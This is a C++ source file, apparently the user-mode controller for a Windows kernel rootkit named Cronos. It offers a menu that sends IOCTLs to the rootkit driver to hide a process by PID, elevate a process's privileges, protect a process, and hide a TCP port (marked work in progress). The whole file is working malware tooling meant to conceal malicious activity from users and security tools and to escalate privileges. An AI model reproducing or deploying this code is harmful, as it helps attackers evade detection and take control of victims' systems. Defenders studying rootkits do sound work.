#include "Header.h"
#include <iostream>
#include <tlhelp32.h>

void InitHP();
void InitElevate();
void InitHPort();
void InitProtProc();

int main()
{
	int option;
	while (TRUE)
	{
		printf(" \n");
		printf(" - Cronos rootkit debugger - \n");
		printf("1. Hide process\n");
		printf("2. Elevate process\n");
		printf("3. Hide port (Work in progress)\n");
		printf("4. Protect process\n");
		printf("0. Close program\n");
		printf("Option: ");
		std::cin >> option;

		if (option > 4)
		{
			printf("\nWrong option (Choose from 0 - 3)\n");
			system("cls");
		}
		else
		{
			switch (option)
			{
			case 0:
				return 0;
				break;

			case 1:
				InitHP();
				break;

			case 2:
				InitElevate();
				break;

			case 3:
				//InitHPort();
				break;

			case 4:
				InitProtProc();
				break;

			default:
				break;
			}
		}
	}
}

BOOL IsProcessRunning(int pid)
{
	HANDLE processCheck = OpenProcess(SYNCHRONIZE, FALSE, pid);
	DWORD ret = WaitForSingleObject(processCheck, 0);
	CloseHandle(processCheck);
	return ret == WAIT_TIMEOUT;
}

void InitHP() //Hide process
{
	system("cls");
	printf("[+] Opening handle to driver\n");
	DWORD pid, write;

	HANDLE hDevice = CreateFile(L"\\\\.\\Cronos", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Couldn't open handle to device (%d). Check if driver is loaded correctly.\n", GetLastError());
		return;
	}

	while (TRUE)
	{
		printf("[?] Set process PID to hide: ");
		std::cin >> pid;
		if (IsProcessRunning(pid))
			break;

		printf("\n[-] Process does not exist.\n");
	}

	printf("\n[+] Writing data to driver...\n");
	HideProcData data;
	data.TargetPID = pid;

	DWORD returned;
	BOOL success = DeviceIoControl(hDevice, IOCTL_HIDEPROC, &data, sizeof(data), nullptr, 0, &returned, nullptr);
	if (success)
		printf("[!] Process has been hidden!\n");
	else
		printf("[-] Failed to hide processes\n");
}

void InitElevate() //Process elevation
{
	system("cls");
	printf("[+] Opening handle to driver\n");
	DWORD pid;

	HANDLE hDevice = CreateFile(L"\\\\.\\Cronos", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Couldn't open handle to device (%d). Check if driver is loaded correctly.\n", GetLastError());
		return;
	}

	while (TRUE)
	{
		printf("[?] Set process PID to elevate: ");
		std::cin >> pid;
		if (IsProcessRunning(pid))
			break;

		printf("\n[-] Process does not exist.\n");
	}

	printf("\n[+] Writing data to driver...\n");
	ElevateData data;
	data.TargetPID = pid;

	printf("[+] Got target PID: %d\n", data.TargetPID);
	DWORD returned;
	BOOL success = DeviceIoControl(hDevice, IOCTL_ELEVATEME, &data, sizeof(data), nullptr, 0, &returned, nullptr);
	if (success)
		printf("[!] Process has been elevated!\n");
	else
		printf("[-] Failed to elevate process\n");
}

//Work in progress
void InitHPort()
{
	system("cls");
	printf("[+] Opening handle to driver\n");
	DWORD port, write;

	HANDLE hDevice = CreateFile(L"\\\\.\\Cronos", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Couldn't open handle to device (%d). Check if driver is loaded correctly.\n", GetLastError());
		return;
	}

	printf("[?] Set TCP port to hide: ");
	std::cin >> port;

	printf("\n[+] Writing data to driver...\n");
	HideTcpData data;
	data.Port = port;

	printf("[+] Hiding port: %d\n", data.Port);
	DWORD returned;
	BOOL success = DeviceIoControl(hDevice, IOCTL_HIDETCP, &data, sizeof(data), nullptr, 0, &returned, nullptr);
	if (success)
		printf("[!] Port has been hidden\n");
	else
		printf("[-] Failed to hide port\n");
}

void InitProtProc() //Process protection
{
	system("cls");

	printf("[!] Process will be also elevated!\n");
	printf("[+] Opening handle to driver\n");
	DWORD pid;

	HANDLE hDevice = CreateFile(L"\\\\.\\Cronos", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Couldn't open handle to device (%d). Check if driver is loaded correctly.\n", GetLastError());
		return;
	}

	while (TRUE)
	{
		printf("[?] Set process PID to hide: ");
		std::cin >> pid;
		if (IsProcessRunning(pid))
			break;

		printf("\n[-] Process does not exist.\n");
	}

	printf("\n[+] Writing data to driver...\n");
	ElevateData data;
	data.TargetPID = pid;

	printf("[+] Got target PID: %d\n", data.TargetPID);
	DWORD returned;
	BOOL success = DeviceIoControl(hDevice, IOCTL_PROTECT, &data, sizeof(data), nullptr, 0, &returned, nullptr);
	if (success)
		printf("[!] Process has been protected!\n");
	else
		printf("[-] Failed to protect process\n");
}